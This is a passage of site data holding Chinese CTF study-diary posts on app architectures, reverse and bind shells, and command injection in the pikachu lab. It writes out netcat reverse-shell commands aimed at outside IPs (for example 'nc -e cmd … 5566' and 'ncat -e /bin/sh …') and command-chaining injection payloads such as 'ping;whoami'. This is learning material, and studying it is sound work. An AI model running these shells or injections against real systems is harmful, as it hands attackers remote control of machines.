演示：",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第49天\n\n今日内容：基础入门-APP架构&小程序&H5+Vue语言&Web封装&原生开发&Flutter\n\n\n\n * 原生开发\n * 使用H5语言开发\n * 使用flutter开发\n * 常规Web开发\n   * 演示：\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第23章：基础入门-APP架构&小程序&H5+Vue语言&Web封装&原生开发&Flutter\n\n\n# 原生开发\n\n**安卓：**安卓一般使用java语言开发，当然也有用kotlin语言开发的\n\n**IOS：**IOS应用一般是用Objective-C开发，也有用Swift进行开发的\n\n\n# 使用H5语言开发\n\n使用H5开发的好处有很多，可多端复用，比如浏览器，ios端，当然H5的开发体验是没有原生开发好的，如果说这个页面需要分享出去的话，就用H5开发\n\n\n# 使用flutter开发\n\nflutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生，但是flutter技术比较新，生态还不完善，开发效率偏低。\n\n\n# 常规Web开发\n\n**引入：**Web App软件开发简单来说，就是开发一个网站，然后加入app的壳，WebApp一般都非常小，内容都是App内的网页显示，受制于网页技术本身，可实现的功能少，而且每次打开，几乎所有的东西都要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有限。但开发周期短，需要的技术人员少，成本低。\n\n\n# 演示：\n\nWindows Server2012 + 宝塔 + ShopXO开源商城 + 一门APP\n\n * 需要记得在阿里云的DNS域名解析中加一条域名解析记录\n * 用宝塔面板的一件部署，安装ShopXO开源商城\n * 视频演示用用到了【一门APP】或者【变色龙】进行网站的打包，可以在里边做相应设置，比如应用图标等\n * App的核心还是网站，在安全测试方面和普通网站没有区别\n * 视频中演示了两个项目的App打包，一个是【ShopXO开源商城】，另一个是【小迪渗透吧】，而商城做了手机端的适配，而博客没做",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第49天\n\n今日内容：基础入门-app架构&小程序&h5+vue语言&web封装&原生开发&flutter\n\n\n\n * 原生开发\n * 使用h5语言开发\n * 使用flutter开发\n * 常规web开发\n   * 演示：\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第23章：基础入门-app架构&小程序&h5+vue语言&web封装&原生开发&flutter\n\n\n# 原生开发\n\n**安卓：**安卓一般使用java语言开发，当然也有用kotlin语言开发的\n\n**ios：**ios应用一般是用objective-c开发，也有用swift进行开发的\n\n\n# 使用h5语言开发\n\n使用h5开发的好处有很多，可多端复用，比如浏览器，ios端，当然h5的开发体验是没有原生开发好的，如果说这个页面需要分享出去的话，就用h5开发\n\n\n# 使用flutter开发\n\nflutter是近年来谷歌推出的一款ui框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生，但是flutter技术比较新，生态还不完善，开发效率偏低。\n\n\n# 常规web开发\n\n**引入：**web app软件开发简单来说，就是开发一个网站，然后加入app的壳，webapp一般都非常小，内容都是app内的网页显示，受制于网页技术本身，可实现的功能少，而且每次打开，几乎所有的东西都要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有限。但开发周期短，需要的技术人员少，成本低。\n\n\n# 演示：\n\nwindows server2012 + 宝塔 + shopxo开源商城 + 一门app\n\n * 需要记得在阿里云的dns域名解析中加一条域名解析记录\n * 用宝塔面板的一件部署，安装shopxo开源商城\n * 视频演示用用到了【一门app】或者【变色龙】进行网站的打包，可以在里边做相应设置，比如应用图标等\n * app的核心还是网站，在安全测试方面和普通网站没有区别\n * 视频中演示了两个项目的app打包，一个是【shopxo开源商城】，另一个是【小迪渗透吧】，而商城做了手机端的适配，而博客没做",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250110CTF学习笔记36",frontmatter:{title:"20250110CTF学习笔记36",date:"2025-01-10T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-10-CTFLearn.html",relativePath:"views/numerology/2025-01-10-CTFLearn.md",key:"v-7385488c",path:"/views/numerology/2025-01-10-CTFLearn.html",headers:[{level:2,title:"反弹Shell",slug:"反弹shell",normalizedTitle:"反弹shell",charIndex:85},{level:3,title:"反向连接演示",slug:"反向连接演示",normalizedTitle:"反向连接演示",charIndex:98},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:110},{level:3,title:"反弹Shell在内网环境的应用",slug:"反弹shell在内网环境的应用",normalizedTitle:"反弹shell在内网环境的应用",charIndex:118},{level:3,title:"反弹Shell在内网环境的演示实验",slug:"反弹shell在内网环境的演示实验",normalizedTitle:"反弹shell在内网环境的演示实验",charIndex:139}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第52天</p>\n<p>今日内容：基础入门-反弹SHELL&amp;带外查询&amp;正反向连接&amp;防火墙出入站&amp;文件下载</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"反弹Shell 反向连接演示 总结 反弹Shell在内网环境的应用 反弹Shell在内网环境的演示实验",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第52天\n\n今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n\n * 反弹Shell\n   * 反向连接演示\n   * 总结\n   * 反弹Shell在内网环境的应用\n   * 反弹Shell在内网环境的演示实验\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n# 反弹Shell\n\n\n# 反向连接演示\n\n反向连接原理：\n\n * 主动给出去，对方监听，区别于正向连接的本地监听，等待对方来连\n * 反向连接是谁监听，就控制对方\n\nLinux控制Windows：\n\n 1. Windows主动把CMD的权限交给某个IP和端口\n    \n    nc -e cmd 47.94.236.117 5566\n    \n    \n    1\n    \n\n 2. Linux上监听自己的5566端口，等待上钩的鱼，而Windows是主动把钩给Linux\n    \n    ncat -lvp 5566\n    \n    \n    1\n    \n\nWindows控制Linux：\n\n 1. 在Windows上监听5566\n    \n    nc -lvp 5566\n    \n    \n    1\n    \n\n 2. 绑定自己的sh，主动给到对方的5566端口（这里47.122.23.131 5566指的是windows的IP和端口）\n    \n    ncat -e /bin/sh 47.122.23.131 5566\n    \n    \n    1\n    \n\n 3. 实际上这就是Linux主动把权限给到Windows远程上的5566端口，区别于正向连接的Windows主动控制Linux\n\n\n# 总结\n\n这其实是一个正反向的问题，还是刚才的图\n\n * Linux控制Windows有两种选择，一种是正向连接，一种是反向连接。\n   1. 正向连接是Linux主动找到Windows，在Windows本地进行监听，Linux连接Windows的本地端口来实现\n   2. 反向连接是由Windows主动把权限给到Linux，在Linux做本地监听来实现\n * Windows控制Linux也有两种选择，一种是正向连接，一种是反向连接\n   1. 正向连接是Windows主动找到Linux，在Linux本地进行监听，Windows连接Linux的本地端口来实现\n   2. 反向连接是由Linux主动把权限给到Windows，在Windows做本地监听来实现\n\n\n# 反弹Shell在内网环境的应用\n\n**了解内网：**类似公司、学校、网吧都是内网环境，他们的组网方式是通过公网IP来上网的。当用户在运营商处办理宽带业务后，运营商通常会提供一个上网账号，用户需将此账号配置到路由器上相应位置，随后，连接至该路由器的各个终端设备，便可依托此账号接入互联网，实现上网功能。\n\n**思考：**如果要控制内部环境的某一台机器，会出现什么问题呢？\n\n这就涉及到外网IP的单个唯一性，就只有一个主网IP，这个IP地址是全球唯一的。\n\n\n\n这种情况下只能用反向连接，因为我们自己服务器IP是全球唯一的，但我们正向连接的话，只能找到路由器这一层，找不到下方的哪台机器。内网IP是路由器下自己分配的。\n\n**通俗理解：**就像是在学校，最多只能找到宿舍门牌号，如果说给个名字，那没有用，可能有重名的。\n\n**特殊情况：**如果我们要让路由器知道是我们找的哪台机器，这就需要在路由器设置端口转发/端口映射。\n\n\n# 反弹Shell在内网环境的演示实验\n\n视频中演示的是用Linux控制Windows虚拟机，Liunx是用SSH远程连接的，虚拟机是在本地Vmware中运行的，IP是和本机的IP是相同的。\n\n * 首先测试的是正向连接，Linux主动控制Windows，我们进入到Linux中，输入命令：\n   \n   ncat 192.168.124.128 5566\n   \n   \n   1\n   \n\n * 然后到虚拟机上，主动把CMD的权限绑定到端口\n   \n   nc.exe -e cmd lvvp 5566\n   \n   \n   1\n   \n\n * 以上步骤完成后，发现两边都没有反应，长时间以后提示超时，其实这个结果是可以预料到的，用内网IP是肯定行不通的\n\n * 下一步我们让Linux连接我们本机的IP地址，同时也是虚拟机的IP地址，此时我们Windows虚拟机上的nc还没关。\n   \n   ncat 1.30.217.180 5566\n   \n   \n   1\n   \n\n * 然后我们就发现，依然连接不上。原因是这个IP地址相当于路由器的出口，而路由器的出口并没有执行监听操作，所以会连接失败。\n\n * 以上结果表明，我们要想要用Linux控制虚拟机中的Windows，只能通过反向连接，因为我们知道Linux的IP地址，所以让Windows主动将权限给到Linux的5566\n   \n   nc -e cmd 123.123.123.123 5566\n   \n   \n   1\n   \n\n * 下一步是在Linux上去监听5566端口，就能用Linux控制Windows虚拟机，实现反向连接了。\n   \n   nc -lvp 5566\n   \n   \n   1\n   \n\n**结论：**这就是正反向连接的应用价值，需要判断什么时候用正向连接，什么时候用反向连接。\n\n**通俗理解：**他找不到你，你就去找他。\n\n**反向示例：**用Windows虚拟机控制Linux\n\n * 让Linux主动把权限绑定到端口5566，然后让Windows主动连接。\n   \n   # linux上输入以下命令\n   ncat -e /bin/sh -lvp 5566\n   # windows上输入以下命令\n   nc 123.123.123.123 5566\n   \n   \n   1\n   2\n   3\n   4\n   \n\n * 这种从Windows来看，就成了正向连接。如果我们用反向连接，也就是Linux主动把权限给到Windows，这样是行不通的，因为我们找不到这台Windows虚拟机，因为它在内网，所以只能Windows主动发起正向连接。\n\n**挖坑：**如果两边都是内网怎么办？这就涉及到后续的课程了。大致思路是加个中间人就可以了，两边都给到中间人做中转，让中间人作下发。\n\n> 这里讲到的正向连接、反向连接，感觉和我以前做网站开发时，只能本地看本地网站，如果说互联网要看我虚拟机里某个搭建的网站是不可以的，这需要做端口映射，如果不做的话是访问不了的。",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第52天\n\n今日内容：基础入门-反弹shell&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n\n * 反弹shell\n   * 反向连接演示\n   * 总结\n   * 反弹shell在内网环境的应用\n   * 反弹shell在内网环境的演示实验\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第24章：基础入门-反弹shell&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n# 反弹shell\n\n\n# 反向连接演示\n\n反向连接原理：\n\n * 主动给出去，对方监听，区别于正向连接的本地监听，等待对方来连\n * 反向连接是谁监听，就控制对方\n\nlinux控制windows：\n\n 1. windows主动把cmd的权限交给某个ip和端口\n    \n    nc -e cmd 47.94.236.117 5566\n    \n    \n    1\n    \n\n 2. linux上监听自己的5566端口，等待上钩的鱼，而windows是主动把钩给linux\n    \n    ncat -lvp 5566\n    \n    \n    1\n    \n\nwindows控制linux：\n\n 1. 在windows上监听5566\n    \n    nc -lvp 5566\n    \n    \n    1\n    \n\n 2. 绑定自己的sh，主动给到对方的5566端口（这里47.122.23.131 5566指的是windows的ip和端口）\n    \n    ncat -e /bin/sh 47.122.23.131 5566\n    \n    \n    1\n    \n\n 3. 实际上这就是linux主动把权限给到windows远程上的5566端口，区别于正向连接的windows主动控制linux\n\n\n# 总结\n\n这其实是一个正反向的问题，还是刚才的图\n\n * linux控制windows有两种选择，一种是正向连接，一种是反向连接。\n   1. 正向连接是linux主动找到windows，在windows本地进行监听，linux连接windows的本地端口来实现\n   2. 反向连接是由windows主动把权限给到linux，在linux做本地监听来实现\n * windows控制linux也有两种选择，一种是正向连接，一种是反向连接\n   1. 正向连接是windows主动找到linux，在linux本地进行监听，windows连接linux的本地端口来实现\n   2. 反向连接是由linux主动把权限给到windows，在windows做本地监听来实现\n\n\n# 反弹shell在内网环境的应用\n\n**了解内网：**类似公司、学校、网吧都是内网环境，他们的组网方式是通过公网ip来上网的。当用户在运营商处办理宽带业务后，运营商通常会提供一个上网账号，用户需将此账号配置到路由器上相应位置，随后，连接至该路由器的各个终端设备，便可依托此账号接入互联网，实现上网功能。\n\n**思考：**如果要控制内部环境的某一台机器，会出现什么问题呢？\n\n这就涉及到外网ip的单个唯一性，就只有一个主网ip，这个ip地址是全球唯一的。\n\n\n\n这种情况下只能用反向连接，因为我们自己服务器ip是全球唯一的，但我们正向连接的话，只能找到路由器这一层，找不到下方的哪台机器。内网ip是路由器下自己分配的。\n\n**通俗理解：**就像是在学校，最多只能找到宿舍门牌号，如果说给个名字，那没有用，可能有重名的。\n\n**特殊情况：**如果我们要让路由器知道是我们找的哪台机器，这就需要在路由器设置端口转发/端口映射。\n\n\n# 反弹shell在内网环境的演示实验\n\n视频中演示的是用linux控制windows虚拟机，liunx是用ssh远程连接的，虚拟机是在本地vmware中运行的，ip是和本机的ip是相同的。\n\n * 首先测试的是正向连接，linux主动控制windows，我们进入到linux中，输入命令：\n   \n   ncat 192.168.124.128 5566\n   \n   \n   1\n   \n\n * 然后到虚拟机上，主动把cmd的权限绑定到端口\n   \n   nc.exe -e cmd lvvp 5566\n   \n   \n   1\n   \n\n * 以上步骤完成后，发现两边都没有反应，长时间以后提示超时，其实这个结果是可以预料到的，用内网ip是肯定行不通的\n\n * 下一步我们让linux连接我们本机的ip地址，同时也是虚拟机的ip地址，此时我们windows虚拟机上的nc还没关。\n   \n   ncat 1.30.217.180 5566\n   \n   \n   1\n   \n\n * 然后我们就发现，依然连接不上。原因是这个ip地址相当于路由器的出口，而路由器的出口并没有执行监听操作，所以会连接失败。\n\n * 以上结果表明，我们要想要用linux控制虚拟机中的windows，只能通过反向连接，因为我们知道linux的ip地址，所以让windows主动将权限给到linux的5566\n   \n   nc -e cmd 123.123.123.123 5566\n   \n   \n   1\n   \n\n * 下一步是在linux上去监听5566端口，就能用linux控制windows虚拟机，实现反向连接了。\n   \n   nc -lvp 5566\n   \n   \n   1\n   \n\n**结论：**这就是正反向连接的应用价值，需要判断什么时候用正向连接，什么时候用反向连接。\n\n**通俗理解：**他找不到你，你就去找他。\n\n**反向示例：**用windows虚拟机控制linux\n\n * 让linux主动把权限绑定到端口5566，然后让windows主动连接。\n   \n   # linux上输入以下命令\n   ncat -e /bin/sh -lvp 5566\n   # windows上输入以下命令\n   nc 123.123.123.123 5566\n   \n   \n   1\n   2\n   3\n   4\n   \n\n * 这种从windows来看，就成了正向连接。如果我们用反向连接，也就是linux主动把权限给到windows，这样是行不通的，因为我们找不到这台windows虚拟机，因为它在内网，所以只能windows主动发起正向连接。\n\n**挖坑：**如果两边都是内网怎么办？这就涉及到后续的课程了。大致思路是加个中间人就可以了，两边都给到中间人做中转，让中间人作下发。\n\n> 这里讲到的正向连接、反向连接，感觉和我以前做网站开发时，只能本地看本地网站，如果说互联网要看我虚拟机里某个搭建的网站是不可以的，这需要做端口映射，如果不做的话是访问不了的。",charsets:{cjk:!0},lastUpdated:"2025/01/10, 21:43:44",lastUpdatedTimestamp:1736516624e3},{title:"20250111CTF学习笔记37",frontmatter:{title:"20250111CTF学习笔记37",date:"2025-01-11T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-11-CTFLearn.html",relativePath:"views/numerology/2025-01-11-CTFLearn.md",key:"v-496d1b3c",path:"/views/numerology/2025-01-11-CTFLearn.html",headers:[{level:2,title:"防火墙出入站",slug:"防火墙出入站",normalizedTitle:"防火墙出入站",charIndex:67},{level:3,title:"防火墙绕过&正向连接&反向连接&内网服务器演示",slug:"防火墙绕过-正向连接-反向连接-内网服务器演示",normalizedTitle:"防火墙绕过&amp;正向连接&amp;反向连接&amp;内网服务器演示",charIndex:null}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第53天</p>\n<p>今日内容：基础入门-反弹SHELL&amp;带外查询&amp;正反向连接&amp;防火墙出入站&amp;文件下载</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"防火墙出入站 防火墙绕过&正向连接&反向连接&内网服务器演示",content:'从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第53天\n\n今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n\n * 防火墙出入站\n   * 防火墙绕过&正向连接&反向连接&内网服务器演示\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n# 防火墙出入站\n\n\n\n\n# 防火墙绕过&正向连接&反向连接&内网服务器演示\n\n> 我的Wmware的Win10虚拟机在机械硬盘上，是真的慢，这就不是机械硬盘的正确用法，应该是用来做NAS才最好。\n\n 1. 搭建环境\n    \n    搭建pikachu漏洞练习平台【搭建教程】\n    \n    \n\n 2. 找到RCE-exec "ping"这个选项，我们看到有个输入框，可以输入IP地址然后进行ping\n    \n    \n\n 3. 我们利用管道符来进行命令拼接\n    \n    系统        管道符   连接符   或    与    分号   反引号包起来\n    Windows   |     &     ||   &&        \n    Linux     |     &     ||   &&   ;    ``\n    \n    command1 && command2 先执行 command1，如果为真，再执行 command2 \n    command1 | command2 只执行 command2 \n    command1 & command2 先执行 command2 后执行 command1\n    command1 || command2 先执行 command1，如果为假，再执行 command2\n    ``包起来的内容会先执行\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n    \n    [userapp@AiObcRD ~]$ echo 1111 && echo 2222\n    1111\n    2222\n    \n    [userapp@AiObcRD ~]$ echo 1111 | echo 2222\n    2222\n    \n    [userapp@AiObcRD ~]$ echo 1111 & echo 2222\n    [1] 9295\n    2222\n    1111\n    \n    [userapp@AiObcRD ~]$ echo 1111 || echo 2222\n    1111\n    [1]+  完成                  echo 1111\n    \n    [userapp@AiObcRD ~]$ rm 1.txt || whoami\n    rm: 无法删除"1.txt": 没有那个文件或目录\n    userapp\n    \n    [userapp@AiObcRD ~]$ echo "当前目录下的文件数量是：`ls | wc -l`"\n    当前目录下的文件数量是：4\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    \n\n 4. 我们用管道符后，发现是执行后边这条命令\n    \n    [userapp@AiObcRD ~]$ ping 127.0.0.1 | whoami\n    userapp\n    \n    \n    1\n    2\n    \n    \n    然后我们看看用反引号包起来的情况，ping找不到路径，但pwd执行了\n    \n    [userapp@AiObcRD ~]$ ping `pwd`\n    ping: /home/userapp: 未知的名称或服务\n    \n    \n    1\n    2\n    \n    \n    我们也可以试试用分号，ping报错了，但whoami执行了\n    \n    [userapp@AiObcRD ~]$ ping;whoami\n    Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]\n                [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]\n                [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]\n                [-w deadline] [-W timeout] [hop1 ...] destination\n    Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]\n                 [-l preload] [-m mark] [-M pmtudisc_option]\n                 [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]\n                 [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]\n                 [-W timeout] destination\n    userapp\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 5. Windows里是没有分号和反引号包起来这样的用法的。',normalizedContent:'从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第53天\n\n今日内容：基础入门-反弹shell&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n\n * 防火墙出入站\n   * 防火墙绕过&正向连接&反向连接&内网服务器演示\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第24章：基础入门-反弹shell&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n# 防火墙出入站\n\n\n\n\n# 防火墙绕过&正向连接&反向连接&内网服务器演示\n\n> 我的wmware的win10虚拟机在机械硬盘上，是真的慢，这就不是机械硬盘的正确用法，应该是用来做nas才最好。\n\n 1. 搭建环境\n    \n    搭建pikachu漏洞练习平台【搭建教程】\n    \n    \n\n 2. 找到rce-exec "ping"这个选项，我们看到有个输入框，可以输入ip地址然后进行ping\n    \n    \n\n 3. 我们利用管道符来进行命令拼接\n    \n    系统        管道符   连接符   或    与    分号   反引号包起来\n    windows   |     &     ||   &&        \n    linux     |     &     ||   &&   ;    ``\n    \n    command1 && command2 先执行 command1，如果为真，再执行 command2 \n    command1 | command2 只执行 command2 \n    command1 & command2 先执行 command2 后执行 command1\n    command1 || command2 先执行 command1，如果为假，再执行 command2\n    ``包起来的内容会先执行\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n    \n    [userapp@aiobcrd ~]$ echo 1111 && echo 2222\n    1111\n    2222\n    \n    [userapp@aiobcrd ~]$ echo 1111 | echo 2222\n    2222\n    \n    [userapp@aiobcrd ~]$ echo 1111 & echo 2222\n    [1] 9295\n    2222\n    1111\n    \n    [userapp@aiobcrd ~]$ echo 1111 || echo 2222\n    1111\n    [1]+  完成                  echo 1111\n    \n    [userapp@aiobcrd ~]$ rm 1.txt || whoami\n    rm: 无法删除"1.txt": 没有那个文件或目录\n    userapp\n    \n    [userapp@aiobcrd ~]$ echo "当前目录下的文件数量是：`ls | wc -l`"\n    当前目录下的文件数量是：4\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    \n\n 4. 我们用管道符后，发现是执行后边这条命令\n    \n    [userapp@aiobcrd ~]$ ping 127.0.0.1 | whoami\n    userapp\n    \n    \n    1\n    2\n    \n    \n    然后我们看看用反引号包起来的情况，ping找不到路径，但pwd执行了\n    \n    [userapp@aiobcrd ~]$ ping `pwd`\n    ping: /home/userapp: 未知的名称或服务\n    \n    \n    1\n    2\n    \n    \n    我们也可以试试用分号，ping报错了，但whoami执行了\n    \n    [userapp@aiobcrd ~]$ ping;whoami\n    usage: ping [-aabbddfhlnoqrruvv64] [-c count] [-i interval] [-i interface]\n                [-m mark] [-m pmtudisc_option] [-l preload] [-p pattern] [-q tos]\n                [-s packetsize] [-s sndbuf] [-t ttl] [-t timestamp_option]\n                [-w deadline] [-w timeout] [hop1 ...] destination\n    usage: ping -6 [-aabbddfhlnoqrruvv] [-c count] [-i interval] [-i interface]\n                 [-l preload] [-m mark] [-m pmtudisc_option]\n                 [-n nodeinfo_option] [-p pattern] [-q tclass] [-s packetsize]\n                 [-s sndbuf] [-t ttl] [-t timestamp_option] [-w deadline]\n                 [-w timeout] destination\n    userapp\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 5. windows里是没有分号和反引号包起来这样的用法的。',charsets:{cjk:!0}},{title:"20250107CTF学习笔记34",frontmatter:{title:"20250107CTF学习笔记34",date:"2025-01-07T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-07-CTFLearn.html",relativePath:"views/numerology/2025-01-07-CTFLearn.md",key:"v-79c3678a",path:"/views/numerology/2025-01-07-CTFLearn.html",headers:[{level:2,title:"原生开发",slug:"原生开发",normalizedTitle:"原生开发",charIndex:73},{level:3,title:"理解：",slug:"理解",normalizedTitle:"理解：",charIndex:102},{level:3,title:"演示：",slug:"演示",normalizedTitle:"演示：",charIndex:111},{level:3,title:"渗透思路：",slug:"渗透思路",normalizedTitle:"渗透思路：",charIndex:120},{level:2,title:"使用H5语言开发",slug:"使用h5语言开发",normalizedTitle:"使用h5语言开发",charIndex:129},{level:3,title:"简述：",slug:"简述",normalizedTitle:"简述：",charIndex:143},{level:3,title:"演示：",slug:"演示-2",normalizedTitle:"演示：",charIndex:111},{level:3,title:"安全影响：",slug:"安全影响",normalizedTitle:"安全影响：",charIndex:161},{level:2,title:"小程序开发（属于H5+Vue开发的一种）",slug:"小程序开发-属于h5-vue开发的一种",normalizedTitle:"小程序开发（属于h5+vue开发的一种）",charIndex:170},{level:3,title:"演示：",slug:"演示-3",normalizedTitle:"演示：",charIndex:111},{level:3,title:"渗透测试思路：",slug:"渗透测试思路",normalizedTitle:"渗透测试思路：",charIndex:205},{level:3,title:"其他情况",slug:"其他情况",normalizedTitle:"其他情况",charIndex:218},{level:2,title:"思维导图",slug:"思维导图",normalizedTitle:"思维导图",charIndex:226}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第50天</p>\n<p>今日内容：基础入门-APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"原生开发 理解： 演示： 渗透思路： 使用H5语言开发 简述： 演示： 安全影响： 小程序开发（属于H5+Vue开发的一种） 演示： 渗透测试思路： 其他情况 思维导图",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第50天\n\n今日内容：基础入门-APP架构&小程序&H5+Vue语言&Web封装&原生开发&Flutter\n\n\n\n * 原生开发\n   * 理解：\n   * 演示：\n   * 渗透思路：\n * 使用H5语言开发\n   * 简述：\n   * 演示：\n   * 安全影响：\n * 小程序开发（属于H5+Vue开发的一种）\n   * 演示：\n   * 渗透测试思路：\n   * 其他情况\n * 思维导图\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第23章：基础入门-APP架构&小程序&H5+Vue语言&Web封装&原生开发&Flutter\n\n\n# 原生开发\n\n**安卓：**安卓一般使用java语言开发，当然也有用kotlin语言开发的\n\n**IOS：**IOS应用一般是用Objective-C开发，也有用Swift进行开发的\n\n\n# 理解：\n\n简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件完成。\n\n\n# 演示：\n\n * Android studio + 安卓开发 + 仿网易云音乐【remusic】\n * Objective-C + IOS开发（未演示）\n\n这种方式开发的App，界面是和网站开发不同的，有多个页面切换、设置等，安卓项目源码里能看到都是Java语言开发的。\n\n\n# 渗透思路：\n\n * 利用安卓逆向技术进行反编译，利用安全测试技术进行抓包，从反编译和抓包提取App的资产信息，找到有哪些接口、资产信息等。至于后面的安全测试是属于网站的、接口的、单个IP的，根据App的特性决定。\n * 从逆向的角度分析代码逻辑、设计问题\n\n\n# 使用H5语言开发\n\n\n# 简述：\n\n使用H5开发的好处有很多，可多端复用，比如浏览器，ios端，当然H5的开发体验是没有原生开发好的，如果说这个页面需要分享出去的话，就用H5开发。\n\n\n# 演示：\n\nHbuilder X + uni-app框架演示示例（H5&Vue）\n\n * 编译以后，发现网站端和App端显示的是基本一样的\n * 通过该项目源码发现，是用HTML5来开发的，是专门针对App、小程序应用的\n * 数据传输是用Vue框架，页面由H5负责\n * 和以前的php .net java jsp asp等语言不同，是用的H5&Vue\n\n\n# 安全影响：\n\n * API&js框架安全问题、接口漏洞\n * 以前的php、.net漏洞都不存在了，类似于之前说的前后端分离\n\n\n# 小程序开发（属于H5+Vue开发的一种）\n\n\n# 演示：\n\n在Hbuilder X中点击文件-发行-小程序微信（仅适用于uni-app），用微信公众号送的AppId发行\n\n此外，还需要用到【微信开发者工具】，用工具打开后，可以看到模拟微信的小程序界面\n\n\n# 渗透测试思路：\n\n和H5的测试思路相同，常规的php、.net漏洞都不存在了，需要找Js框架漏洞，以及接口漏洞\n\n\n# 其他情况\n\n微信小程序可以通过封装普通的网站来实现，在封装的配置里选择小程序\n\n演示：【ShopXO开源商城】 + 【一门APP】\n\n**安全影响：**属于常规Web安全测试（php那种）\n\n\n# 思维导图\n\n",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第50天\n\n今日内容：基础入门-app架构&小程序&h5+vue语言&web封装&原生开发&flutter\n\n\n\n * 原生开发\n   * 理解：\n   * 演示：\n   * 渗透思路：\n * 使用h5语言开发\n   * 简述：\n   * 演示：\n   * 安全影响：\n * 小程序开发（属于h5+vue开发的一种）\n   * 演示：\n   * 渗透测试思路：\n   * 其他情况\n * 思维导图\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第23章：基础入门-app架构&小程序&h5+vue语言&web封装&原生开发&flutter\n\n\n# 原生开发\n\n**安卓：**安卓一般使用java语言开发，当然也有用kotlin语言开发的\n\n**ios：**ios应用一般是用objective-c开发，也有用swift进行开发的\n\n\n# 理解：\n\n简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件完成。\n\n\n# 演示：\n\n * android studio + 安卓开发 + 仿网易云音乐【remusic】\n * objective-c + ios开发（未演示）\n\n这种方式开发的app，界面是和网站开发不同的，有多个页面切换、设置等，安卓项目源码里能看到都是java语言开发的。\n\n\n# 渗透思路：\n\n * 